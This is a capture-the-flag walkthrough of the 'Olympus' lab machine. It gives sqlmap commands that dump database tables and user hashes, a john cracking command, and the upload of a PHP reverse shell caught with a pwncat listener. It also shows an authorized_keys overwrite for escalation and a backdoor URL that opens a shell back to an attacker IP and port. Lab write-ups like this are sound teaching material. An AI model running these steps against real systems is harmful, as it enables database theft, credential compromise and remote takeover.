---
title: "Olympus"
description: ""
pubDate: "Jul 15 2022"
heroImage: "/Olympus/olympus.jpeg"
---

## **Scanning:-**

### **Nmap:-**

## nmap -A -T4 -p- [ IP ]

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 0a:78:14:04:2c:df:25:fb:4e:a2:14:34:80:0b:85:39 (RSA)
|   256 8d:56:01:ca:55:de:e1:7c:64:04:ce:e6:f1:a5:c7:ac (ECDSA)
|_  256 1f:c1:be:3f:9c:e7:8e:24:33:34:a6:44:af:68:4c:3c (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Olympus
|_http-server-header: Apache/2.4.41 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=7/18%OT=22%CT=1%CU=33277%PV=Y%DS=2%DC=T%G=Y%TM=62D505F
OS:6%P=x86_64-pc-linux-gnu)SEQ(SP=FE%GCD=1%ISR=101%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11
OS:NW7%O6=M505ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(
OS:R=Y%DF=Y%T=40%W=F507%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## **/etc/hosts**

![Untitled](/Olympus/Untitled.png)

![Untitled](/Olympus/Untitled%201.png)

## **olympus.thm**

![Untitled](/Olympus/Untitled%202.png)

## **enumeration**

![Untitled](/Olympus/Untitled%203.png)

## Visit Olympus.thm

```bash
**http://olympus.thm/~webmaster/**
```

![Untitled](/Olympus/Untitled%204.png)

## Exploit

```bash
https://www.exploit-db.com/exploits/48734
```

## SQL injection

```bash
	sqlmap -u "http://olympus.thm/~webmaster/search.php" --data="search=1337*&submit=" --dbs --random-agent -v 3
```

![Untitled](/Olympus/Untitled%205.png)

```bash
sqlmap -u "http://olympus.thm/~webmaster/search.php" --data="search=1337*&submit=" -D olympus --random-agent -v 3 --batch --tables
```

![Untitled](/Olympus/Untitled%206.png)

```bash
sqlmap -u "http://olympus.thm/~webmaster/search.php" --data="search=1337*&submit=" -D olympus --random-agent -v 3 --batch -T users --dump
```

![Untitled](/Olympus/Untitled%207.png)

## **Cracking Hashes**

```bash
sudo john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
```

![Untitled](/Olympus/Untitled%208.png)

## **Login**

![Untitled](/Olympus/Untitled%209.png)

![Untitled](/Olympus/Untitled%2010.png)

## **Sub domain**

![Untitled](/Olympus/Untitled%2011.png)

**Let’s add subdomain in hosts** 

## Visit chat.Olympus.thm

![Untitled](/Olympus/Untitled%2012.png)

## **Login**

**Reuse the old credentials which we found earlier**

![Untitled](/Olympus/Untitled%2013.png)

## **Reverse Shell**

**Send a php reverse shell file.**

![Untitled](/Olympus/Untitled%2014.png)

**We cannot access the file by the original name.The file name changed after the files upload.Let’s use SQL injection again to find the name of the file.**

**Filname:-**

```bash
sqlmap -u "http://olympus.thm/~webmaster/search.php" --data="search=1337*&submit=" -D olympus --random-agent -v 3 --batch --tables
```

![Untitled](/Olympus/Untitled%2015.png)

```bash
sqlmap -u "http://olympus.thm/~webmaster/search.php" --data="search=1337*&submit=" -D olympus --random-agent -v 3 --batch -T chats --dump
```

![Untitled](/Olympus/Untitled%2016.png)

Exploiting:-

Start Listener:-

```bash
sudo pwncat-cs -l -p 1234
```

Visit the link:-

```bash
http://chat.olympus.thm/uploads/1323f6d43cd467f78da284dee8106534.php
```

![Untitled](/Olympus/Untitled%2017.png)

## Local Privilege Escalation:-

![Untitled](/Olympus/Untitled%2018.png)

**Generate ssh key:-**

```bash
ssh-keygen
```

![Untitled](/Olympus/Untitled%2019.png)

**Copy the id_rsa.pub to the victim machine**.

![Untitled](/Olympus/Untitled%2020.png)

**Overwrite:-**

**Run the cputils and Select the id_rsa.pub and set the target to /home/zeus/.ssh/authorized_keys**

![Untitled](/Olympus/Untitled%2021.png)

**ssh login as zeus:-**

![Untitled](/Olympus/Untitled%2022.png)

## Root:-

![Untitled](/Olympus/Untitled%2023.png)

**Let’s Visit the php page:-**

![Untitled](/Olympus/Untitled%2024.png)

**Login using the password which found inside the php file.**

![Untitled](/Olympus/Untitled%2025.png)

![Untitled](/Olympus/Untitled%2026.png)

**Start Listener:-**

Set Ip=[your ip]&port=[listener port]

```bash
http://10.10.194.107/0aB44fdS3eDnLkpsz3deGv8TttR4sc/VIGQFQFMYOST.php?ip=10.18.8.246&port=4321
```

![Untitled](/Olympus/Untitled%2027.png)

**We got shell:-**

![Untitled](/Olympus/Untitled%2028.png)

![Untitled](/Olympus/Untitled%2029.png)